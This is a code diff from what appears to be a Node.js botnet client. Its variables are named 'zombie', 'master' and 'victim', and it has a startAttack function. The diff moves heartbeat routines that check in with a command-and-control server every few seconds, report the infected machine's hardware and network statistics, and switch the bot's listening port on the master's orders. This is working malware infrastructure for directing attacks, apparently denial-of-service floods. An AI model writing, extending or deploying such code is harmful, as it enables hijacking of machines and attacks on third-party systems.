@@ -247,6 +247,84 @@ settingIntegrity.on('true', () => {
     si.getStaticData(function (data) {
         zombie.systemInfo.static = data
     })
+
+    async function complexHeartbeat() {
+        if (!zombie.busy) {
+            axios.post("http://" + master + "/heartbeat", { machine: zombie })
+                .then(res => {
+    
+                })
+                .catch(err => {
+                    console.error(err);
+                })
+        }
+    }
+    async function simpleHeartbeat() {
+        axios.get("http://" + master + "/heartbeat")
+            .then(res => {
+                if (res.data.port.changeAt < Date.now() || res.data.port.last === zombie.port) {
+                    console.log(res.data.port.changeAt < Date.now());
+                    console.log(res.data.port.last === zombie.port);
+                    zombie.port = res.data.port.number
+                    htserver.close()
+                    htserver = app.listen(zombie.port, () => console.log(`App listening on port! ${zombie.port}`))
+                    console.log(res.data);
+                }
+            })
+            .catch(err => {
+                console.error(err);
+            })
+    }
+    
+    simpleHeartbeat();
+    complexHeartbeat();
+    
+    setInterval(function () {
+        simpleHeartbeat()
+    }, 5000)
+    
+    
+    setInterval(function () {
+        complexHeartbeat()
+    }, 60000)
+    
+    setInterval(() => {
+        siDataPlacement()
+    }, 10000);
+    
+    si.getDynamicData(function (data) {
+        zombie.systemInfo.dynamic.all = data
+    })
+    setInterval(() => {
+        if (!zombie.busy) {
+            si.getDynamicData(function (data) {
+                zombie.systemInfo.dynamic.all = data
+            })
+        }
+    }, 30000);
+    
+    async function siDataPlacement() {
+        if (!zombie.busy) {
+            si.cpu(function (cpudata) {
+                zombie.systemInfo.dynamic.cpu.voltage = cpudata.voltage
+                zombie.systemInfo.dynamic.cpu.speed = cpudata.speed
+                zombie.systemInfo.dynamic.cpu.brand = cpudata.brand
+            })
+            si.mem(function (memdata) {
+                zombie.systemInfo.dynamic.mem.total = memdata.total
+                zombie.systemInfo.dynamic.mem.free = memdata.free
+                zombie.systemInfo.dynamic.mem.used = memdata.used
+                zombie.systemInfo.dynamic.mem.active = memdata.active
+                zombie.systemInfo.dynamic.mem.available = memdata.available
+            })
+            si.currentLoad(function (data) {
+                zombie.systemInfo.dynamic.load = data
+            })
+            si.networkStats(function (data) {
+                zombie.systemInfo.dynamic.net = data
+            })
+        }
+    }
 });
 
 async function startAttack(methodData, victim, time) {
@@ -284,83 +362,7 @@ async function startAttack(methodData, victim, time) {
 
 }
 
-async function complexHeartbeat() {
-    if (!zombie.busy) {
-        axios.post("http://" + master + "/heartbeat", { machine: zombie })
-            .then(res => {
 
-            })
-            .catch(err => {
-                console.error(err);
-            })
-    }
-}
-async function simpleHeartbeat() {
-    axios.get("http://" + master + "/heartbeat")
-        .then(res => {
-            if (res.data.port.changeAt < Date.now() || res.data.port.last === zombie.port) {
-                console.log(res.data.port.changeAt < Date.now());
-                console.log(res.data.port.last === zombie.port);
-                zombie.port = res.data.port.number
-                htserver.close()
-                htserver = app.listen(zombie.port, () => console.log(`App listening on port! ${zombie.port}`))
-                console.log(res.data);
-            }
-        })
-        .catch(err => {
-            console.error(err);
-        })
-}
-
-simpleHeartbeat();
-complexHeartbeat();
-
-setInterval(function () {
-    simpleHeartbeat()
-}, 5000)
-
-
-setInterval(function () {
-    complexHeartbeat()
-}, 60000)
-
-setInterval(() => {
-    siDataPlacement()
-}, 10000);
-
-si.getDynamicData(function (data) {
-    zombie.systemInfo.dynamic.all = data
-})
-setInterval(() => {
-    if (!zombie.busy) {
-        si.getDynamicData(function (data) {
-            zombie.systemInfo.dynamic.all = data
-        })
-    }
-}, 30000);
-
-async function siDataPlacement() {
-    if (!zombie.busy) {
-        si.cpu(function (cpudata) {
-            zombie.systemInfo.dynamic.cpu.voltage = cpudata.voltage
-            zombie.systemInfo.dynamic.cpu.speed = cpudata.speed
-            zombie.systemInfo.dynamic.cpu.brand = cpudata.brand
-        })
-        si.mem(function (memdata) {
-            zombie.systemInfo.dynamic.mem.total = memdata.total
-            zombie.systemInfo.dynamic.mem.free = memdata.free
-            zombie.systemInfo.dynamic.mem.used = memdata.used
-            zombie.systemInfo.dynamic.mem.active = memdata.active
-            zombie.systemInfo.dynamic.mem.available = memdata.available
-        })
-        si.currentLoad(function (data) {
-            zombie.systemInfo.dynamic.load = data
-        })
-        si.networkStats(function (data) {
-            zombie.systemInfo.dynamic.net = data
-        })
-    }
-}
 
 /*
 
